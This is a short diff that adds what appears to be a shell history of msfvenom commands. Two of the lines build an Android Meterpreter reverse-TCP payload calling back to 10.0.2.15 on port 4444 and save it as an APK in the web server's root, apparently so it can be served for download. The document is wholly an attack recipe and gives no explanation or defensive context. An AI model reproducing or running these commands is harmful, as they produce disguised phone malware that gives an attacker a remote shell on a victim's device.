@@ -1,0 +1,6 @@
+msfvenom
+msfvenom -help
+msfvenom -p android/meterpreter/reverse_tcp LHOST=10.0.2.15 LPORT=4444 R > /var/www/html/AndroidApp.apk
+msfvenom -p android/meterpreter/reverse_tcp LHOST=10.0.2.15 LPORT=4444 R > /var/www/html/androidApp.apk
+EXTI
+exit
